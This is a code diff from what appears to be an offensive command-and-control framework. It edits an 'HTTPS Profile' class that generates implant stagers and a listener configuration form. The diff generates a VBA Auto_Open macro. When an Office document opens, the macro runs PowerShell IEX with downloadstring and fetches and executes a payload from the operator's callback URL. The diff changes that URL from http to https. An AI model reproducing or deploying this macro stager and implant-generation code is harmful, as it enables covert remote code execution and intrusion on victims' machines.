@@ -2,7 +2,7 @@
 
 class HttpsProfile:
     name = "HTTPS Profile"
-    description = "This is a basic network profile which use base64 commands and unencrypted traffic"
+    description = "This is a basic network profile which use base64 commands and is encrypted over via standard TLS. Uses 3 seperate enpoints."
     profile_tag = "HttpsProfile"
 
     def get_powershell_code(self):
@@ -43,20 +43,20 @@ function {{ ron.HttpsProfile }}(${{ ron.obf_callback_reason }}){
         stager_string = f'''
 Sub Auto_Open()
 Dim exec As String
-exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('http://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}/error.htm?user={implant_data['stager_key']}'))"""
+exec = "powershell.exe ""IEX ((new-object net.webclient).downloadstring('https://{implant_data['callback_url']}:{implant_data['network_profiles'][self.profile_tag]}/error.htm?user={implant_data['stager_key']}'))"""
 Shell (exec)
 End Sub
 :return:'''
         return stager_string
 
     def get_webform(self):
-        a = '''
-<div class="checkbox">
-    <label><input type="checkbox" name="HttpsProfile" value="off"> Basic HTTP Profile</label>
-    <input type="text" class="form-control" id="HttpsProfile" name="HttpsProfile" placeholder="TCP Port for binary listener">
-</div>
-'''
-        return a
+        webform = (f"<div>"
+                   f"    <label  class=\"font-weight-bold\" >{self.name}</label>"
+                   f'    <p><span class="font-italic">If left blank this network profile will not be included in the implant.</span><p>'
+                   f'    <input type="text" class="form-control" id="{self.profile_tag}" name="{self.profile_tag}" placeholder="TCP port for HTTPS listener">'
+                   f"</div>")
+
+        return webform
 
     def validate_web_form(self, key, value):
         try:
